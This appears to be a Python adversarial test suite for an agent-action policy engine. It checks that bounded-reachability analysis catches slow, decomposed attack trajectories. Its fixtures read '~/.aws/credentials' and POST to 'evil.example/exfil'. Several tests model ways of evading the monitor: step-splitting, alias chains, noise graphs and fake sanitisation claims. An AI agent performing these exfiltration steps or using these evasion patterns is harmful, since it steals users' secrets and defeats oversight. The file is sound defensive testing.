"""Long-horizon / horizon-camping adversarial suite (AC–AP).

Security question: can an attacker defeat bounded reachability merely by
decomposing a dangerous operation into many individually legitimate steps?

These tests try to break the model. They do not raise max_depth to "pass".
"""

from __future__ import annotations

import time

from varden.models import Action
from varden.predictive_authority.graph import (
    CapabilityGraph,
    EdgeEvidence,
    EdgeKind,
    GraphEdge,
    GraphNode,
)
from varden.predictive_authority.hazardous import detect_hazardous_paths
from varden.predictive_authority.lifecycle import add_sanitisation_boundary, revoke_capability
from varden.predictive_authority.reachability import (
    authority_hop_cost,
    bounded_reachability,
)
from varden.predictive_authority.registry import get_authority_registry

from tests.predictive_authority.helpers import fresh_engine, run_step, untrusted_meta
from tests.predictive_authority.horizon_harness import (
    TrajectoryReport,
    build_authority_chain_graph,
    run_action_trajectory,
    slow_authority_actions,
)


def test_ac_depth_plus_one_sequential_enters_horizon():
    """H1: sink initially outside raw horizon; authority-hop depth catches camping."""
    depth = 3
    g = build_authority_chain_graph(intermediates=1, with_credential_at=0, alias_after_credential=4)
    raw = bounded_reachability(
        g,
        ["cap:credential.aws"],
        max_depth=depth,
        predicate=lambda n: "aws.ec2.modify" in n,
    )
    assert raw.reachable is False  # raw hops would miss
    findings = detect_hazardous_paths(g, max_depth=depth)
    assert any(f.pattern == "credential_to_cloud_mutation" for f in findings)

    engine = fresh_engine(mode="enforce", max_depth=depth)
    actions = slow_authority_actions("ac-h1", 5)
    report = run_action_trajectory(engine, actions, scenario="AC", sink_index=len(actions) - 1)
    assert report.first_predictive_detection_action is not None
    assert report.intercepted_before_sink is True
    assert report.warning_distance is not None and report.warning_distance >= 0


def test_ad_ae_af_slow_accumulation_8_16_32():
    """H2–H4: 8/16/32-step trajectories; sink must not execute as allow under enforce."""
    rows: list[TrajectoryReport] = []
    for length, name in ((8, "AD"), (16, "AE"), (32, "AF")):
        engine = fresh_engine(mode="enforce", max_depth=3)
        actions = slow_authority_actions(f"{name.lower()}-{length}", length)
        report = run_action_trajectory(engine, actions, scenario=name, sink_index=len(actions) - 1)
        rows.append(report)
        assert report.first_predictive_detection_action is not None, report.to_dict()
        sink_step = report.steps[-1]
        assert sink_step.final_decision in {"require_approval", "block", "approval_required"}
        assert report.intercepted_before_sink is True
        assert report.warning_distance is not None
        assert report.first_predictive_detection_action <= length
    assert all(r.configured_depth == 3 for r in rows)


def test_ag_horizon_camping_alias_chain_detected():
    """Attacker keeps privileged sink behind depth+1 aliases — must not evade."""
    depth = 3
    g = CapabilityGraph()
    g.add_node(
        GraphNode(
            node_id="cap:credential.aws",
            node_type="credential",
            label="credential.aws",
            metadata={"credential": True},
        )
    )
    prev = "cap:credential.aws"
    for i in range(depth + 1):
        nid = f"cap:camp.{i}"
        g.add_node(GraphNode(node_id=nid, node_type="capability", label=nid))
        g.add_edge(GraphEdge(src=prev, dst=nid, kind=EdgeKind.ENABLES, evidence=EdgeEvidence.OBSERVED))
        prev = nid
    cloud = "cap:aws.ec2.modify"
    g.add_node(GraphNode(node_id=cloud, node_type="capability", label=cloud))
    g.add_edge(GraphEdge(src=prev, dst=cloud, kind=EdgeKind.REACHES, evidence=EdgeEvidence.OBSERVED))

    raw = bounded_reachability(g, ["cap:credential.aws"], max_depth=depth, target=cloud)
    assert raw.reachable is False
    findings = detect_hazardous_paths(g, max_depth=depth)
    assert any(f.pattern == "credential_to_cloud_mutation" for f in findings)


def test_ah_capability_drip_one_per_action():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "ah-drip"
    actions = []
    for i in range(10):
        actions.append(
            Action(
                type="tool_call",
                tool=f"acquire_cap_{i}",
                args={"capability": f"tool.capability.{i}"},
                metadata=untrusted_meta(),
                trace_id=tid,
                tenant_id="adv",
            )
        )
    actions.append(
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        )
    )
    actions.append(
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/exfil",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        )
    )
    report = run_action_trajectory(engine, actions, scenario="AH", sink_index=len(actions) - 1)
    assert report.first_predictive_detection_action is not None
    assert report.steps[-1].final_decision != "allow"


def test_ai_cross_mcp_long_trajectory_retains_provenance():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "ai-mcp"
    meta_a = {**untrusted_meta("cross-issue"), "mcp_server": "mcp-a", "authority_domain": "domain-a"}
    meta_b = {**untrusted_meta("cross-issue"), "mcp_server": "mcp-b", "authority_domain": "domain-b"}
    meta_c = {**untrusted_meta("cross-issue"), "mcp_server": "mcp-c", "authority_domain": "domain-c"}
    actions = [
        Action(type="tool_call", tool="mcp.a.ingest", metadata=meta_a, trace_id=tid, tenant_id="adv"),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["local/cache.json", "r"]},
            metadata=meta_a,
            trace_id=tid,
            tenant_id="adv",
        ),
        Action(type="tool_call", tool="mcp.b.discover", metadata=meta_b, trace_id=tid, tenant_id="adv"),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=meta_b,
            trace_id=tid,
            tenant_id="adv",
        ),
        Action(type="tool_call", tool="mcp.c.cloud", metadata=meta_c, trace_id=tid, tenant_id="adv"),
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/exfil",
            domain="evil.example",
            metadata=meta_c,
            trace_id=tid,
            tenant_id="adv",
        ),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["other.txt", "r"]},
            metadata=meta_a,
            trace_id=tid,
            tenant_id="adv",
        ),
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/exfil2",
            domain="evil.example",
            metadata=meta_c,
            trace_id=tid,
            tenant_id="adv",
        ),
    ]
    report = run_action_trajectory(engine, actions, scenario="AI", sink_index=5)
    state = get_authority_registry().get("adv:ai-mcp")
    assert state is not None
    assert any(
        (n.metadata or {}).get("trust_level") == "untrusted" or n.node_type == "untrusted_content"
        for n in state.graph.nodes()
    )
    assert report.first_predictive_detection_action is not None
    assert report.intercepted_before_sink is True


def test_aj_noisy_graph_cannot_hide_trajectory():
    """Meaningful path surrounded by noise; truncation must not become SAFE."""
    for noise in (100, 1000, 10_000):
        g = build_authority_chain_graph(intermediates=2, with_credential_at=1, alias_after_credential=0)
        for i in range(noise):
            nid = f"cap:noise.{i}"
            g.add_node(GraphNode(node_id=nid, node_type="capability", label=nid))
            if i > 0:
                g.add_edge(
                    GraphEdge(
                        src=f"cap:noise.{i-1}",
                        dst=nid,
                        kind=EdgeKind.ENABLES,
                        evidence=EdgeEvidence.OBSERVED,
                    )
                )
        t0 = time.perf_counter()
        findings = detect_hazardous_paths(g, max_depth=3)
        dt = (time.perf_counter() - t0) * 1000.0
        assert any("credential" in f.pattern for f in findings), f"noise={noise} dt={dt}"
        if g.truncated:
            r = bounded_reachability(
                g,
                ["cap:credential.aws"],
                max_depth=3,
                predicate=lambda n: "aws.ec2" in n,
                hop_cost=lambda e, d: authority_hop_cost(e, d, g),
            )
            assert r.safe_conclusion is False


def test_ak_branch_explosion_one_hazardous_branch():
    g = CapabilityGraph(max_nodes=50_000, max_edges=200_000)
    g.add_node(
        GraphNode(
            node_id="cap:credential.aws",
            node_type="credential",
            label="c",
            metadata={"credential": True},
        )
    )
    for i in range(10):
        mid = f"cap:branch.{i}"
        g.add_node(GraphNode(node_id=mid, node_type="capability", label=mid))
        g.add_edge(
            GraphEdge(src="cap:credential.aws", dst=mid, kind=EdgeKind.ENABLES, evidence=EdgeEvidence.OBSERVED)
        )
        for j in range(10):
            leaf = f"cap:leaf.{i}.{j}"
            g.add_node(GraphNode(node_id=leaf, node_type="capability", label=leaf))
            g.add_edge(GraphEdge(src=mid, dst=leaf, kind=EdgeKind.ENABLES, evidence=EdgeEvidence.OBSERVED))
    cloud = "cap:aws.ec2.modify"
    g.add_node(GraphNode(node_id=cloud, node_type="capability", label=cloud))
    g.add_edge(
        GraphEdge(src="cap:leaf.7.3", dst=cloud, kind=EdgeKind.REACHES, evidence=EdgeEvidence.OBSERVED)
    )
    t0 = time.perf_counter()
    findings = detect_hazardous_paths(g, max_depth=3)
    dt = (time.perf_counter() - t0) * 1000.0
    assert any(f.pattern == "credential_to_cloud_mutation" for f in findings), dt


def test_al_alias_indirection_cannot_erase_authority():
    g = CapabilityGraph()
    g.add_node(
        GraphNode(
            node_id="cap:credential.aws",
            node_type="credential",
            label="credential.aws",
            metadata={"credential": True},
        )
    )
    chain = [
        "cap:cloud.identity",
        "cap:deployment.identity",
        "cap:infrastructure.writer",
        "cap:aws.ec2.modify",
    ]
    prev = "cap:credential.aws"
    for nid in chain:
        g.add_node(GraphNode(node_id=nid, node_type="capability", label=nid))
        g.add_edge(GraphEdge(src=prev, dst=nid, kind=EdgeKind.ENABLES, evidence=EdgeEvidence.OBSERVED))
        prev = nid
    findings = detect_hazardous_paths(g, max_depth=3)
    assert any(f.pattern == "credential_to_cloud_mutation" for f in findings)


def test_am_acquire_revoke_reacquire_lifecycle():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "am-lifecycle"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        ),
    )
    state = get_authority_registry().get("adv:am-lifecycle")
    assert state is not None
    findings_before = detect_hazardous_paths(state.graph, max_depth=3)
    assert findings_before

    revoke_capability(state, "credential.aws", reason="test_revoke")
    for name in list(state.capabilities.keys()):
        if name.startswith("aws.") or name.startswith("credential."):
            revoke_capability(state, name, reason="test_revoke")

    _final, result = run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        ),
    )
    assert result.findings or (result.recommendation and result.recommendation.action != "allow")
    final2, _result2 = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/exfil",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        ),
    )
    assert final2.action in {"require_approval", "block", "approval_required"}


def test_an_trusted_property_specific_declassification():
    g = CapabilityGraph()
    g.add_node(
        GraphNode(
            node_id="res:secret",
            node_type="resource",
            label="secret",
            metadata={"sensitivity": "secret"},
        )
    )
    g.add_node(
        GraphNode(
            node_id="untrusted:src",
            node_type="untrusted_content",
            label="u",
            metadata={"trust_level": "untrusted"},
        )
    )
    g.add_node(
        GraphNode(node_id="sink:ext", node_type="sink", label="sink", metadata={"external_sink": True})
    )
    g.add_edge(
        GraphEdge(src="untrusted:src", dst="res:secret", kind=EdgeKind.FLOWS_TO, evidence=EdgeEvidence.OBSERVED)
    )
    add_sanitisation_boundary(
        g,
        from_node="res:secret",
        boundary_id="declass:1",
        to_node="sink:ext",
        trusted=True,
        cleared_properties=["SECRET"],
    )
    boundary = g.get_node("declass:1")
    assert boundary is not None
    assert boundary.metadata.get("cleared_properties") == ["SECRET"]
    assert boundary.metadata.get("trusted_information_flow_declassification") is True
    r = bounded_reachability(g, ["res:secret"], max_depth=3, target="sink:ext")
    assert r.reachable is False
    assert any(e.src == "untrusted:src" and e.dst == "res:secret" for e in g.edges())


def test_ao_fake_declassification_rejected():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "ao-fake"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="adv",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/exfil",
            domain="evil.example",
            metadata={**untrusted_meta(), "claimed_sanitised": True},
            trace_id=tid,
            tenant_id="adv",
        ),
    )
    assert final.action != "allow" or result.findings


def test_ap_incomplete_analysis_never_safe():
    engine = fresh_engine(mode="enforce", max_depth=3, max_nodes=8, max_edges=16)
    tid = "ap-trunc"
    for i in range(20):
        final, result = run_step(
            engine,
            Action(
                type="filesystem_read",
                tool="open",
                args={"args": [f"/tmp/noise-{i}.txt", "r"]},
                metadata=untrusted_meta(),
                trace_id=tid,
                tenant_id="adv",
            ),
        )
        if result.analysis_status == "truncated":
            meta = result.to_metadata()
            assert meta.get("safe_conclusion") is False
            if engine.config.is_enforce():
                assert final.action in {"require_approval", "block", "approval_required"}
            return
    state = get_authority_registry().get("adv:ap-trunc")
    assert state is not None
    assert state.graph.truncated is True
